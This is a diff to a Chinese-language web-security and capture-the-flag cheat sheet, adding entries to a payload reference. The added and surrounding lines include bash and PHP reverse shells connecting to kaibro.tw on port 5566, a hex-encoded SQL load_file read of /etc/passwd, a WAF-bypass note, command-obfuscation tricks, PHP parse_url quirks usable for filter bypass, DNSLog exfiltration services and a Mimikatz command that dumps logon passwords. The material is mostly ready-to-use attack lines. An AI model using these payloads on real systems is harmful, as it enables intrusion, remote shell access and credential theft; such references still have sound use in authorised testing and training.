@@ -98,6 +98,7 @@ A=fl;B=ag;cat $A$B
 
 - Bash
     - `bash -i >& /dev/tcp/kaibro.tw/5566 0>&1`
+    - `bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
 
 - PHP
     - `php -r '$sock=fsockopen("kaibro.tw",5566);exec("/bin/sh -i <&3 >&3 2>&3");'`
@@ -202,6 +203,36 @@ A=fl;B=ag;cat $A$B
 
 - `is_numeric(" \t\r\n 123");` => `1`
 
+## parse_url
+
+- 在處理傳入的URL會有問題
+- `parse_url('/a.php?id=1')`
+    
+    ```
+    array(2) {
+      ["host"]=>
+        string(5) "a.php"
+      ["query"]=>
+        string(4) "id=1"
+    }
+    ```
+- `parse_url('///a.php?id=1')`
+    - false
+
+- `parse_url('/a.php?id=1:80')`
+    - false
+
+- `parse_url('http://kaibro.tw:87878')`
+    - 5.3.X版本以下
+        ```
+        array(3) { 
+            ["scheme"]=> string(4) "http" 
+            ["host"]=> string(9) "kaibro.tw" 
+            ["port"]=> int(22342) 
+        }
+        ```
+    - 其他： false
+
 ## 其他
 
 - `echo (true ? 'a' : false ? 'b' : 'c');`
@@ -304,7 +335,7 @@ cat $(ls)
     - `SELECT load_file(0x2F6574632F706173737764);`
         - /etc/passwd
     - 可繞過一些WAF
-        - e.g. 用在不能使用單引號時，`'` => `\'`
+        - e.g. 用在不能使用單引號時(`'` => `\'`)
 - 註解：
     - `#`
     - `--`
@@ -1313,6 +1344,10 @@ xxe.dtd:
 - https://github.com/swisskyrepo/PayloadsAllTheThings/
 
 - http://xssor.io
+
+- DNSLog
+    - http://ceye.io
+    - https://www.t00ls.net/dnslog.html
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
